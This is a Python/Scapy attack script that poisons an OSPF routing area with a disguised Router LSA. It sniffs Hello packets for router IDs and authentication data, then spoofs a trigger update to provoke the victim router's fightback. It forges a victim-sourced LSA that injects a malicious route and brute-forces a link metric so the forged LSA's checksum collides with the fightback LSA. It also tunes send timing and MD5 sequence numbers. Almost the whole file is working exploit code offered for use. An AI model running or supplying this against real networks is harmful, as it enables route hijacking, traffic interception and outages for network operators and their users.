#! /usr/bin/env python
"""
This script is used to attack an OSPF router area with a disguised Router LSA message.
This script receives 4 arguments of which 3 are mandatory parameters.
IMPT: To enhance the reliability of the attack, certain parameters have been defined as configurables that can be edited on a case-by-case basis depending on the physical hardware.

## Victim router
This is the router we ultimately want to spoof as to send a LSUpdate packet disguised as from a legitamate router(the victm router). This router receives a LSUpdate packet that contains false LSAs about itself. This specially crafted LSU is referred to as the trigger packet meant to trigger the fightback mechanism on the victim router.

This value of the victim router should be the IP address of the victim router's interface in the network.

## Neighbor router
This router is the subject of the disguised LSA message. This router has to be a neighbor listed in the victim's router's configuration (show ip ospf neighbor). Neighbor relationships are discovered dynamically through OSPF Hello Protocol. 
This router recives the disguised LSA message and the fight back LSA from the victim router. It considers both LSA the same and discards the LSA that comes later.

This field should contain the IP address of the neighbor router receiving interface in the network.

## Interface
This is the network interface to use for sniffing and for sending both the trigger and the disguised
packets on the host.
Use `conf.ifaces` to view the list of interfaces on the host machine.

## MD5Authentication
This is the MD5 authentication key used by routers in the network in OSPF Authentication procedure.
This field is required if MD5 authentication is enabled. If no MD5 authentication is configured in the network, this field can be left blank.

### Sample command
./disguised-lsa.py -v 192.168.21.5 -n 192.168.21.6 -i eth0 -key 123
"""

import sys
import argparse
import time

"""
Import Scapy and disable error printing on console.
"""
sys.stderr = None
from scapy.all import *
import scapy.contrib.ospf
sys.stderr = sys.__stderr__

#####################################################
# Configurables										#
#####################################################
# time_to_send_ms: Milliseconds to wait after the legitimate LSA is sent from the victim router before sending the trigger and disguised LSA. 
time_to_send_ms = 4800 
# 	It is not recommended to set this value above 5000 and below 4500.

# Number of packets to sniff 
sniff_count = 5
# This value is used in sniffing hello packets to 
	# get router interface IP address to router ID mapping and 
	# get relative values between system time and authentication seq (MD5)

# system byte order [Little or Big Endian]
sys.byteorder = "big"

#####################################################
# Globals and Constants								#
#####################################################
# Global variables used in this script
auth_seq_tracker = dict() #dictionary containing relative value of the authentication sequence number per router interface
start_minlsinterval = 0 #Time in milliseconds where the victim's router MinLSInterval cooldown begins

#CONSATANTS
MINLSINTERVAL = 5000 #MinLSInterval in milliseconds
#####################################################
# Utils functions		 							#
#####################################################

def construct_ospf(pkt):
	"""
	Construct OSPF layer from packet payload
	"""
	
	bytes_pkt = bytes(pkt)
	if IP in pkt and pkt[IP].proto == 89:
		if OSPF_Hdr in pkt:
			ospf_data = bytes_pkt[34:] #strip Ether and IP layers (14+20)
			
			# Build OSPF header 
			ospf_hdr = ospf_data[:24]
			header = OSPF_Hdr(
				version = ospf_hdr[0],
				type = ospf_hdr[1],
				len = int.from_bytes(ospf_hdr[2:4], sys.byteorder),
				src = '.'.join(str(octet) for octet in ospf_hdr[4:8]),
				area = '.'.join(str(octet) for octet in ospf_hdr[8:12]),
				chksum = int.from_bytes(ospf_hdr[12:14], sys.byteorder),
				authtype = authtype if (authtype := int.from_bytes(ospf_hdr[14:16], sys.byteorder)) != 2 else 0,
				authdata = int.from_bytes(ospf_hdr[16:24], sys.byteorder)
			)
							
			# Analyze ospf payload and populate the values accordingly
			ospf_payload = ospf_data[24:header.len]
			if header.type == 1: #Hello
				ospf_pkt = header/OSPF_Hello(ospf_payload)
			elif header.type == 2: #DBDesc
				data = OSPF_DBDesc(
					mtu = int.from_bytes(ospf_payload[:2], sys.byteorder),
					options = ospf_payload[2],
					dbdescr = ospf_payload[3],
					ddseq = int.from_bytes(ospf_payload[4:8], sys.byteorder),
					lsaheaders = [],
				)
				offset = 8
				for i in range((len(ospf_payload) - 8) // 20 ):
					lsaheader = ospf_payload[offset+i*20:offset+(i+1)*20]
					instance = OSPF_LSA_Hdr(
						age = int.from_bytes(lsaheader[0:2], sys.byteorder),
						options = lsaheader[2],
						type = lsaheader[3],
						id = '.'.join(str(octet) for octet in lsaheader[4:8]),
						adrouter = '.'.join(str(octet) for octet in lsaheader[8:12]),
						seq = int.from_bytes(lsaheader[12:16], sys.byteorder),
						chksum = int.from_bytes(lsaheader[16:18], sys.byteorder),
						len = int.from_bytes(lsaheader[18:20], sys.byteorder),
					)
					data.lsaheaders.append(instance)
				ospf_pkt = header/data
			elif header.type == 3: #LSReq
				data = OSPF_LSReq(
					requests = [],
				)
				offset = 0
				for i in range(len(ospf_payload) // 12 ):
					lsreq = ospf_payload[offset+i*12:offset+(i+1)*21]
					instance = OSPF_LSReq_Item(
						type = lsreq[0:4],
						id = '.'.join(str(octet) for octet in lsreq[4:8]),
						adrouter = '.'.join(str(octet) for octet in lsreq[8:12]),
					)
					data.requests.append(instance)
				ospf_pkt = header/data
			elif header.type == 4: #LSUpd
				count = int.from_bytes(ospf_payload[:4], sys.byteorder)
				data = OSPF_LSUpd(
					lsacount = count,
					lsalist = []
				)
				
				offset = 4
				
				for i in range(count):
					lsa_instance = ospf_payload[offset:]
					type = lsa_instance[3]
					lsclass = scapy.contrib.ospf._OSPF_LSclasses[type] if type in scapy.contrib.ospf._OSPF_LSclasses.keys() else "Raw"
					lsclass = getattr(scapy.contrib.ospf, lsclass) if lsclass != "Raw" else globals()[lsclass]
					LS_len = int.from_bytes(lsa_instance[18:20], sys.byteorder)
					lsa_instance = lsa_instance[:LS_len]
					
					instance = lsclass(lsa_instance)
					data.lsalist.append(instance)
					offset += LS_len
					
				ospf_pkt = header/data
			elif header.type == 5: #LSAck
				#ospf_data = OSPF_Hdr(bytes(header)+ospf_data)
				data = OSPF_LSAck(
					lsaheaders = [],
				)
				offset = 0
				for i in range(len(ospf_payload) // 20 ):
					lsaheader = ospf_payload[offset+i*20:offset+(i+1)*20]
					instance = OSPF_LSA_Hdr(
						age = int.from_bytes(lsaheader[0:2], sys.byteorder),
						options = lsaheader[2],
						type = lsaheader[3],
						id = '.'.join(str(octet) for octet in lsaheader[4:8]),
						adrouter = '.'.join(str(octet) for octet in lsaheader[8:12]),
						seq = int.from_bytes(lsaheader[12:16], sys.byteorder),
						chksum = int.from_bytes(lsaheader[16:18], sys.byteorder),
						len = int.from_bytes(lsaheader[18:20], sys.byteorder),
					)
					data.lsaheaders.append(instance)
				ospf_pkt = header/data

			#Authentication: MD5
			if int.from_bytes(ospf_hdr[14:16], sys.byteorder) == 2:
				ospf_pkt[OSPF_Hdr].authtype = 2
				ospf_pkt[OSPF_Hdr].reserved = int.from_bytes(ospf_hdr[16:18], sys.byteorder)
				ospf_pkt[OSPF_Hdr].keyid = ospf_hdr[18]
				ospf_pkt[OSPF_Hdr].authdatalen = ospf_hdr[19]
				ospf_pkt[OSPF_Hdr].seq = int.from_bytes(ospf_hdr[20:24], sys.byteorder)
				ospf_pkt[OSPF_Hdr].authdata16 = (ospf_data[header.len:header.len+16]).hex()

		return ospf_pkt
	return pkt
	
	
def check_hello_packet(pkt):
	""" 
	Checks if the given packet is a OSPF Hello Packet
	"""
	if OSPF_Hdr in pkt and pkt[OSPF_Hdr].type == 1:
		#check for Hello Packet message type
		return True
	return False


def filter_victim_LSA(victim, pkt):
	"""
	Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.
	"""
	current_time = round(time.time()*1000)
	pkt = construct_ospf(pkt)
	
	if  OSPF_Hdr in pkt and OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim: 
					global start_minlsinterval 
					start_minlsinterval = current_time
					return True
	return False

def update_auth_seq(pkt):
	"""
	Update the auth sequence dictionary with the relative difference between router interface auth seq and system time
	"""
	pkt = construct_ospf(pkt)

	router_id = pkt[OSPF_Hdr].src # identify router interface by its router's router id
	if router_id not in auth_seq_tracker.keys(): # initialize new entry for each router interface in the network
		auth_seq_tracker[router_id] = 0
	# Get authentication sequence in bytes and convert it to int
	hdr_seq = int.from_bytes(bytes(pkt[OSPF_Hdr])[20:24], sys.byteorder) 
	curr_time = round(time.time()*1000)
	time_offset = hdr_seq - curr_time # get relative difference from system time and authentication seq

	# Debugging purposes
	# if time_offset != auth_seq_tracker[router_id]:
	# 	print(f"At {curr_time}, changing {auth_seq_tracker[router_id]} to {time_offset} where authseq = {hdr_seq} ")

	# Update auth_seq_tracker
	auth_seq_tracker[router_id] = (time_offset,curr_time)
	return

def auth_seq_sniff():
		
	sniff(lfilter= lambda pkt: OSPF_Hdr in pkt, iface=iface, prn=update_auth_seq, count=sniff_count)


def build_dict(pkts):
	"""
	Builds 2 dictionaries.
		- Router interface IP address to Router ID mapping
		- Relevant Authentication data [authtype, keyid]
	"""
	# Initialize default values
	ip_to_router_id = dict()
	authentication = {"authtype":0}
	authentication["authdata"] = []
	
	for pkt in pkts:
		if IP in pkt and not pkt[IP].src in ip_to_router_id.keys():
			ip_to_router_id[pkt[IP].src] = pkt[OSPF_Hdr].src
		if OSPF_Hdr in pkt and pkt[OSPF_Hdr].authtype == 2:
			authentication["authtype"] = 2
			wrpcap('export_md5_pkts.pcap', pkt, append=True)
			authentication["keyid"] = pkt[OSPF_Hdr].keyid
		elif OSPF_Hdr in pkt and pkt[OSPF_Hdr].authtype == 1:
			authentication["authtype"] = 1
			authentication["authkey"] = pkt[OSPF_Hdr].authdata

	return ip_to_router_id, authentication


def get_victim_lsa(victim_routerId, pkt):
	"""
	Returns the legitamate victim router LSA from the original captured packet
	"""
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if OSPF_Router_LSA in lsa:
				if lsa[OSPF_Router_LSA].adrouter == victim_routerId:
					return lsa[OSPF_Router_LSA]
				
	return None

	
def get_required_params(victim_routerId, pkt_orig):
	"""
	Extract victim lsa from the original captured packet, OSPF area id
	"""
	victim_lsa = get_victim_lsa(victim_routerId, pkt_orig)
	if victim_lsa is None:
		print("Link State Advertisement of the victim router not found!")
		sys.exit(1)
	area = pkt_orig[OSPF_Hdr].area
	return area, victim_lsa


def get_fake_metric_value(fightback_lsa, evil_lsa, dummy_link_index):
	"""
	Calculates a suitable metric value for a dummy LSA link such that it will clash with the fightback lsa
	"""
	
	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy() # Create a deep copy of the disguised LSA as obj is mutable
	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())

	# Brute force checksum
	for metric in range (0,65535):
		tmp_lsa[OSPF_Router_LSA].linklist[dummy_link_index].metric = metric
		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())
		if tmp_checksum == fightback_checksum:
			print("[+] Collision found!")
			return metric
		
	# No clash within the 65535 metric values, return 0
	return 0



def Create_disguised_packet_ospf(ip_to_router_id, authentication, victim_lsa, area="0.0.0.0", authkey=None):
	"""
	Returns disguised packet OSPF header and OSPF LSUpdate payload as separate variable
	"""
	# Initialize OSPF header
	disguised_ospf_hdr = OSPF_Hdr(
				version=2,
				type=4,
				src=ip_to_router_id[victim_ip],
				area=area,
				chksum=None,
				len=None,
				authtype= authentication["authtype"],)
	
	# Populate OSPF Header with correct authentication fields
	if disguised_ospf_hdr.authtype == 2:
		disguised_ospf_hdr.authdata16 = authkey
		disguised_ospf_hdr.keyid = authentication["keyid"]
	elif trig_ospf_hdr.authtype == 1:
		disguised_ospf_hdr.authdata = authkey
	#else:
	
	
	disguised_falsified_LSA = victim_lsa.copy() # do deep copy as obj is mutable
	disguised_falsified_LSA.seq = victim_lsa.seq +2 #TODO: account for delay in sending
	disguised_falsified_LSA.chksum = None 
	
	disguised_falsified_LSA.id = ip_to_router_id[victim_ip]
	disguised_falsified_LSA.adrouter = ip_to_router_id[victim_ip]

	#Generate malicious link to be injected in the Link State Database
	malicious_link = OSPF_Link(metric=0,
								toscount=0,
								type=3,
								data= "255.255.255.224",
								id= "192.168.3.96")
	
	#Generate a dummy link for the chksum to clash with the expected fightback packet
	checksum_link = OSPF_Link(	metric=0,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.66.0")
	
	#Insert the malicious link(s) and dummy link
	disguised_falsified_LSA.linklist.extend(malicious_link)
	disguised_falsified_LSA.linklist.extend(checksum_link) #always add dummy link last

	# Alter the LSA size and LSA link count to accomodate the new injected links
	disguised_falsified_LSA.len += 2 * 12
	disguised_LS_Update = OSPF_LSUpd(lsalist=[disguised_falsified_LSA])
	disguised_falsified_LSA.linkcount = len(disguised_LS_Update.lsalist[-1][OSPF_Router_LSA].linklist)
	
	
	count = disguised_LS_Update.lsalist[-1][OSPF_Router_LSA].linkcount - 1

	victim_lsa.seq += 2 # Update the victim LSA with correct expected sequence number 

	print("[+] Brute forcing checksum...")
	faked_metric =  get_fake_metric_value(victim_lsa, disguised_LS_Update.lsalist[-1][OSPF_Router_LSA], count)
	# Update the dummy link with faked metric value designed to clash with expected fightback LSA
	disguised_LS_Update.lsalist[-1][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric
	
	return disguised_ospf_hdr, disguised_LS_Update

def Create_trigger_packet_ospf(ip_to_router_id, authentication, victim_lsa, area="0.0.0.0", authkey=None):
	""""
	Returns trigger packet OSPF header and OSPF LSUpdate payload as separate variables
	"""

	# Initialize OSPF header
	trig_ospf_hdr = OSPF_Hdr(
				version=2,
				type=4,
				src=ip_to_router_id[neighbor_ip],
				area=area,
				chksum=None,
				len=None,
				authtype= authentication["authtype"],)
	
	#populate OSPF Header with correct authentication fields
	if trig_ospf_hdr.authtype == 2: 
		# MD5 authentication
		trig_ospf_hdr.authdata16 = authkey
		trig_ospf_hdr.keyid = authentication["keyid"]
	elif trig_ospf_hdr.authtype == 1:
		# Plaintext authentication
		trig_ospf_hdr.authdata = authkey
	#else:
	
	# Create a trigger LSA
	trig_falsified_LSA = OSPF_Router_LSA()
	trig_falsified_LSA.age = victim_lsa.age
	trig_falsified_LSA.options = victim_lsa.options
	trig_falsified_LSA.type = victim_lsa.type
	trig_falsified_LSA.seq = victim_lsa.seq + 1 #TODO: account for delay in sending packet
	trig_falsified_LSA.chksum = None
	trig_falsified_LSA.flags = victim_lsa.flags
	
	# Populate the Link State ID and Advertising router ID with the vic router's router ID to trigger the fightback mechanism
	trig_falsified_LSA.id = ip_to_router_id[victim_ip]
	trig_falsified_LSA.adrouter = ip_to_router_id[victim_ip]

	# Insert a trigger link for disrepancies to victim router's links
	trigger_link = OSPF_Link(metric=1,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.66.0")
	trig_falsified_LSA.linklist.extend(trigger_link)

	# Create OSPF LSUpdate payload and initialize values
	trig_LS_Update = OSPF_LSUpd(lsalist=[trig_falsified_LSA])
	trig_LS_Update.lsalist[-1][OSPF_Router_LSA].linkcount = len(trig_LS_Update.lsalist[-1][OSPF_Router_LSA].linklist)

	return trig_ospf_hdr, trig_LS_Update


if __name__ == '__main__':

	"""
    Load the Scapy's OSPF module
    """
	load_contrib("ospf")
	
	"""
	Getting arguments from the command line
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victim_ip", help="[mandatory] The interface IP address of the victim router")
	parser.add_argument("-n", "--neighbor_ip", help="[mandatory] The IP to send the disguised LSA to (the neighbor of the victim router)")
	parser.add_argument("-i", "--iface", help="[mandatory] The interface to use for sniffing and sending packets")
	parser.add_argument("-k", "--md5authentication", help="Proceed with the attack given the md5 authentication key", required=False)
	args = parser.parse_args()
	
	authkey = None
	if 	(args.victim_ip == None or
		args.iface == None or
		args.neighbor_ip == None):
		
		parser.print_help()
		sys.exit(1)
	
	#####################################################
	# Getting Arguments from command					#
	#####################################################

	# This is the IP address of the router we want to spoof, the one which receives the trigger packet.
	victim_ip = args.victim_ip

	# This is the IP address of a neighbor of the victim router, to which the disguised LSA is sent.
	neighbor_ip = args.neighbor_ip

	# This is the interface to use for both sniffing and sending packets.
	iface = args.iface

	# MD5 authentication key to authenticate packets sent
	authkey = args.md5authentication

	#####################################################
	# Sniff network for OSPF network configuration		#
	#####################################################

	# Sniff for hello packets to extract router id mapping and authentication data:
	hello_pkts = sniff( iface=iface, lfilter=lambda x: check_hello_packet(x), count = sniff_count)
	ip_to_router_id, authentication = build_dict(hello_pkts)
	
	if authentication["authtype"] == 2 and authkey is None:
		# No authentication key provided for MD5 authentication
		print("ERROR: Network has MD5 authentication enabled but no key was provided to calculate authentication fields.")
		sys.exit(1)

	# Get relative values of authentication sequence to system time
	auth_seq_sniff() if authentication["authtype"] == 2 else 1!=1
	
	
	#####################################################
	# Sniffing for the original package					#
	#####################################################
	print("[+] Staring sniffing for LSUpdate from the victim's router...")

	
	# Sniff all the OSFP packets and stop when the victim router's first OSPF Router LSA is received.
	pkts = sniff( iface=iface, stop_filter=lambda x: filter_victim_LSA(ip_to_router_id[victim_ip],  x))
	

	# Get the last packet and copy it.
	pkt_orig = construct_ospf(pkts[-1])
	
	area, victim_lsa = get_required_params(ip_to_router_id[victim_ip], pkt_orig )

	#####################################################
	# Prepare the trigger packet 						#
	#####################################################

	print("[+] Preparing trigger packet...")

	pkt_trig = Ether(type=0x0800)/IP( src=neighbor_ip,
		   dst=victim_ip if authentication["authtype"] != 2 else "224.0.0.5",
		   chksum=None,
		   len=None,
		   ttl=1,
		   proto=89,)
	trig_ospf_hdr, trig_LS_Update = Create_trigger_packet_ospf(ip_to_router_id, authentication, victim_lsa, area, authkey)

	#####################################################
	# Prepare the disguised packet 						#
	#####################################################
	
	print("[+] Preparing disguised packet...")
	# Pre-emptively prepare the packet IP and Ether layers
	pkt_disguised = Ether(type=0x0800)/IP(src=victim_ip,
		   dst=neighbor_ip if authentication["authtype"] != 2 else "224.0.0.5",
		   chksum=None,
		   len=None,
		   ttl=1,
		   proto=89,)
	# Initialize the disguised packet header and payload(LSUpdate packet)
	disguised_ospf_hdr, disguised_LS_Update = Create_disguised_packet_ospf(ip_to_router_id, authentication, victim_lsa, area, authkey)
	

	print("[+] Waiting to send packets...")
	#diff: time passed since the legimate victim LSA was originated.
	if (diff := round(time.time()*1000) - start_minlsinterval ) < MINLSINTERVAL:
		# Current time - start of MinLSInterval of victim router is less than MINSINTERVAL(5s)
		# denotes that MINSINTERVAL cooldown has not ended yet. [Fightback packet will be delayed and sent only when the cooldown ends]

		# Wait for MinSInterval cooldown to end
		if (time_to_sleep_ms:= time_to_send_ms - diff) > 0:
			time.sleep((time_to_sleep_ms)/1000 )

	print("[+] Crafting packets!")
	# Calculate authentication sequence and Authentication digest for MD5 authentication
	if authentication["authtype"] == 2:
		finished_time = round(time.time())
		trig_ospf_hdr.seq = auth_seq_tracker[trig_ospf_hdr.src][0] + finished_time
		disguised_ospf_hdr.seq = auth_seq_tracker[disguised_ospf_hdr.src][0] + finished_time

	# Craft OSPF packets with IP and Ether layer
	pkt_trig /= trig_ospf_hdr/trig_LS_Update
	pkt_disguised /= disguised_ospf_hdr/disguised_LS_Update

	print("[+] Time to send packets...")
	#Begin attack
	sendpfast([pkt_trig,pkt_disguised], iface=iface)
